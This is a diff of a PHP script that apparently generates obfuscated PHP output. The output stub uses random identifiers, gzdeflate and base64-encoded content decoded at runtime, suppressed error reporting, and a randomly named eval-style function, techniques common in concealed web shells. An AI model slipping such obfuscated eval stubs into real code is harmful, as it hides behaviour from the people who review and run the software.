@@ -1,15 +1,17 @@
-#!/usr/bin/php
 <?php
 
-	error_reporting(E_ALL);
-ini_set("display_errors", "On");
+// are we running from a webserver or terminal?
+if ( ! isset($_SERVER['TERM'])){
+	header('Content-Type: text/plain');
+}
+
 
 function make_random_name(){
 
 	// making some randomness
 	$name = rand() * rand();
 	$name = hash("whirlpool", $name);
-	$name = crypt($name);
+	$name = crypt($name, rand());
 
 	// shorten
 	$name = preg_replace('~([\.\$/]|.{16}$)~', '', $name);
@@ -57,10 +59,10 @@ $_2233['page_html'] = <<< EOF
 <pre>
 EOF;
 
-$_2233['page_html'] = base64_encode(gzdeflate($_2233['page_html']));
+$_2233['page_html']=base64_encode(gzdeflate($_2233['page_html']));
 
 echo '<?php
-error_reporting(0); @ini_set("display_errors", 0);
+error_reporting(0);@ini_set("display_errors", 0);
 $'.$_2233['page_html_var'].' = gzinflate(base64_decode("'.$_2233['page_html'].'"));
 
 function '.$_2233['eval_function'].'($'.$_2233['eval_arg'].'){
